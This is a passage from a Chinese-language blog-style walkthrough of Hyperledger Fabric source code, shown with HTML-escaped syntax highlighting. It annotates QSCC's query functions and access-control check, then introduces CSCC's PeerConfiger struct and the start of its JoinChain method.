&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
    &lt;span style=&#34;color:#75715e&#34;&gt;// args数量小于2时，返回错误信息
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 第一个args为调用的函数名，第二个args为chain ID
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
	&lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

	&lt;span style=&#34;color:#a6e22e&#34;&gt;sp&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;stub&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetSignedProposal&lt;/span&gt;() &lt;span style=&#34;color:#75715e&#34;&gt;// 获取签名交易提议的解码对象，类型为SignedProposal
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	
	&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;InvokedChaincodeName&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ProposalBytes&lt;/span&gt;)

	&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ledgers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetLedger&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;)
	
	&lt;span style=&#34;color:#a6e22e&#34;&gt;qscclogger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Debugf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invoke function: %s on chain: %s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;)

	&lt;span style=&#34;color:#75715e&#34;&gt;// Handle ACL: （ACL：访问控制权限）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getACLResource&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CheckACL&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;sp&lt;/span&gt;); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;access denied for [%s][%s]: [%s]&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;))
	}

    &lt;span style=&#34;color:#75715e&#34;&gt;// 调用相应的函数并传递参数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetTransactionByID&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionByID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByNumber&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByNumber&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByHash&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByHash&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetChainInfo&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getChainInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByTxID&lt;/span&gt;:
		&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByTxID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;targetLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
	}

	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Error&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Requested function %s not found.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;))
}

&lt;span style=&#34;color:#75715e&#34;&gt;// 以下为五个private方法，只能通过invoke进行调用。
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 五个方法在进行异常处理后，调用账本中对应的方法，并将成功或错误结果通过shim发送
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// - getTransactionByID: 返回对应id的交易内容
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionByID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;tid&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#75715e&#34;&gt;// 异常：交易为空
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;processedTran&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetTransactionByID&lt;/span&gt;(string(&lt;span style=&#34;color:#a6e22e&#34;&gt;tid&lt;/span&gt;)) &lt;span style=&#34;color:#75715e&#34;&gt;// 调用ledger.PeerLedger中的方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;processedTran&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 使用proto工具进行编排 my_TODO: read protoutil
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;)
}

&lt;span style=&#34;color:#75715e&#34;&gt;//以下四个方法的整体结果与第一个相似
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByNumber&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;number&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bnum&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strconv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ParseUint&lt;/span&gt;(string(&lt;span style=&#34;color:#a6e22e&#34;&gt;number&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 转换成uint型
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByNumber&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bnum&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 调用账本中的方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;) 
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByHash&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByHash&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;hash&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getChainInfo&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;binfo&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockchainInfo&lt;/span&gt;()
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;binfo&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getBlockByTxID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PeerLedger&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;rawTxID&lt;/span&gt; []&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;pb&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Response&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;txID&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; string(&lt;span style=&#34;color:#a6e22e&#34;&gt;rawTxID&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;vledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetBlockByTxID&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txID&lt;/span&gt;)
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Marshal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;)
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;shim&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Success&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;)
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getACLResource&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; {
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;qscc/&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fname&lt;/span&gt;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;get方法&#34;&gt;Get方法&lt;/h4&gt;
&lt;p&gt;QSCC提供的方法都是get方法，用于从通道中获取各种数据。&lt;/p&gt;
&lt;h3 id=&#34;配置系统链码-configuration-system-chaincode-cscc&#34;&gt;配置系统链码 (&lt;em&gt;Configuration System Chaincode&lt;/em&gt;, CSCC)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;/core/scc/cscc/configure.go&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CSCC管理peer节点上通道相关的信息并执行通道配置交易&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PeerConfiger&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;policyChecker&lt;/span&gt;          &lt;span style=&#34;color:#a6e22e&#34;&gt;policy&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;PolicyChecker&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;configMgr&lt;/span&gt;              &lt;span style=&#34;color:#a6e22e&#34;&gt;config&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Manager&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;aclProvider&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;aclmgmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ACLProvider&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;deployedCCInfoProvider&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ledger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;DeployedChaincodeInfoProvider&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;legacyLifecycle&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;plugindispatcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;LifecycleResources&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;newLifecycle&lt;/span&gt;           &lt;span style=&#34;color:#a6e22e&#34;&gt;plugindispatcher&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;CollectionAndLifecycleResources&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;                   &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;peer&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Peer&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;bccsp&lt;/span&gt;                  &lt;span style=&#34;color:#a6e22e&#34;&gt;bccsp&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BCCSP&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CSCC中提供了PeerConfiger类。这个类实现了peer节点配置信息的处理。对于所有的从排序服务中进来的配置交易，都会调用这个系统链码来处理交易。&lt;/p&gt;
&lt;p&gt;CSCC提供了三种方法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; (
	&lt;span style=&#34;color:#a6e22e&#34;&gt;JoinChain&lt;/span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;JoinChain&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetConfigBlock&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetConfigBlock&amp;#34;&lt;/span&gt;
	&lt;span style=&#34;color:#a6e22e&#34;&gt;GetChannels&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;GetChannels&amp;#34;&lt;/span&gt;
)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;joinchain方法&#34;&gt;JoinChain方法&lt;/h4&gt;
&lt;p&gt;JoinChain 方法用来使一个peer加入通道。它需要一个参数，即通道配置区块的序列化的protobuf byte。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;UnmarshalBlock&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
		&lt;span style=&#34;color:#a6e22e&#34;&gt;cid&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;protoutil&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;GetChainIDFromBlock&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;)
		&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 检查配置块的格式和要求
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 2. 检查加入的政策
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// 初始化txsFilter
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;txsFilter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;util&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TxValidationFlags&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metadata&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Metadata&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BlockMetadataIndex_TRANSACTIONS_FILTER&lt;/span&gt;])
